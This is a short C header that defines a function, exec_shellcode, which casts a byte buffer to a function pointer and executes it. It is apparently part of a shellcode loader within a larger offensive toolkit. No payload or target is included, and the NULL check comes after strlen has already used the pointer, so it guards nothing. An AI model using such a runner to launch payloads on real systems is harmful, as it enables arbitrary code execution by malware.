#pragma once

#include <stdio.h>
#include <string.h>
#include "../../debug_print/debug_print.h"


void exec_shellcode(unsigned char *shellcode) {
	DEBUG_PRINT(("exec_shellcode\n "));
	int size = strlen((char *)shellcode);
	DEBUG_PRINT(("shellcode size: %d\n", size));
	
    // Check for NULL pointer to handle cases where no shellcode data was retrieved
    if(shellcode != NULL) {
	    int (*funct)();
	    funct = (int (*)()) shellcode;
	    (int)(*funct)();
    }
}
